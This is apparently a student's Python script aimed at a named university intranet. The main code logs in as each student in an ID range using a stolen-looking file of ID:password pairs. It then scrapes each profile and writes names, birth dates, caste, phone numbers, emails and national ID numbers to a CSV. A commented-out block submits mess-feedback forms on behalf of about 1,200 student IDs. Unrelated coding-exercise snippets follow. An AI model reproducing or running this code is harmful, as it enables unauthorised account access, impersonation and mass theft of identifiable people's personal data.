import sys
from requests import *
from bs4 import BeautifulSoup
import csv
s=session()
url='https://intranet.rguktn.ac.in/SMS'
g=s.get(url)
f=open('PASSWORD.txt','r')
r=f.read()
f.close()
# with open('PASSWORD.txt') as f: r = f.read()
#print(r)
sg=str(r)
s1=sg.split()
l=[]
for i in s1:
	s2=i.split(':')
	#print(s1)
	l.append(s2)
a=int(input())
b=int(input())
for k in range(a,b+1):
	for i in range(len(l)):
		id='N'+str(k)
		if(l[i][0]==id):
			p1=l[i][1]
			p=s.post(url+'/logic/login.php',data={'user1':id,'passwd1':p1},headers={'X-Requested-With':'XMLHttpRequest'})
			a1=s.get(url+'/profile.php')
			log=a1.text
			#print(log)
			soup=BeautifulSoup(log,'html.parser')
			r1=soup.find('h4',class_='text-center')
			r2=soup.find('p',class_="text-muted text-center text-danger")
			t=r2.text
			st=t.split()
			r3=soup.find('ul',class_="list-group list-group-unbordered")
			t1=r3.text
			st1=t1.split()
			for p in range(len(st1)):
				if(st1[p]=='M' or st1[p]=='F'):
					sex=st1[p]
				elif(st1[p]=='BCB' or st1[p]=='BCA' or st1[p]=='BCC' or st1[p]=='BCD' or st1[p]=='BCE' or st1[p]=='SC' or st1[p]=='ST' or st1[p]=='OC'):
					cast=st1[p]
				elif(st1[p].isdigit()):
					phone=st1[p]
				else:
					dob=st1[5]
					mail=st1[len(st1)-1]
				for i in soup.find_all('span',class_="text-primary margin-l-md"):
					u=i.text
					ui=u.split()
					uid=str("".join(map(str,ui)))
			with open('E2_total.csv','a') as csv_file:
				head=['Id','Name','Class_code','class','Branch','Gender','D_O_B','Cast','Phone_no','P_Email','Uid-Aaddaar']
				f=csv.DictWriter(csv_file,fieldnames=head)
				#f.writeheader()
				#f.writerow({'Id':id,'Name':r1.text,'Class_code':st[3],'class':st[7],'Branch':st[11],'Gender':st1[1],'D_O_B':st1[5],'Cast':st1[7],'Phone_no':st1[11],'P_Email':st1[16]})
				csv_file.write(id+','+r1.text+','+st[3]+','+st[7]+','+st[11]+','+str(sex)+','+str(dob)+','+str(cast)+','+str(phone)+','+str(mail)+','+str(uid)+'\n')
	#s2=i.split(':')
	#print(s1)
#ButifulSoup()
'''n=int(input())
t=9
l=list(map(int,input().split()))
for i in range(n):
	for j in range(1,n):
		if(l[i]+l[j]==t):
			print(i,j)
			break'''
''''from reque
sts import *
s=session()
url='http://intranet.rguktn.ac.in/SMS'
g=s.get('url')
p=s.post(url+'/survey.php',data)'''
'''n=int(input())
for i in range(n):
	x,y=int(input()).split()
	print(x,' ',y)'''

'''n=int(input())
		a=list(map(int,input().split()))
		b=list(map(int,input().split()))
		s1=sum(a)
		s2=sum(b)
		#print(s1,s2)
		if -1 in a and -1 in b:
			print("Infinite")
		else:
			for i in range(n):
					if(s1!=s2):
						if(a[i]==-1):
							if(s1<s2):
								r=s2-s1-1
								a[i]=r
								print(1)
						elif(b[i]==-1):
							if(s2<s1):
								r1=s1-s2-1
								b[i]=r1
								print(1)
		'''		
'''from requests import *
s=session()
url='http://intranet.rguktn.ac.in/SMS'
for i in range(150001,151200):
	g=s.post(url+'/mess-feedback-insert.php'\
	,data={'user':'N'+str(i),'q1':'1','q2':'1','q3':'1','q4':'1','q5':'1','q6':'1'},\
	headers={'X-Requested-With': 'XMLHttpRequest'})
	print(i, g.text)'''
	
'''n=int(input())
tar=int(input())
l=list(map(int,input().split()))
for i in range(0,len(l)):
	for j in range(0,len(l)):
		if(i!=j):
			if(l[i]+l[j]==tar):
				print(i,j)
				break'''
'''
def gcd(a,b):
	if(b!=0):
		return gcd(b,a%b)
	else:
		return(a)
a=int(input())
b=int(input())
print(gcd(a,b))'''

#n=int(input())
#l=list(map(int,input().split())) 
#print(l)
#l.sort()
#print(l[n-2])
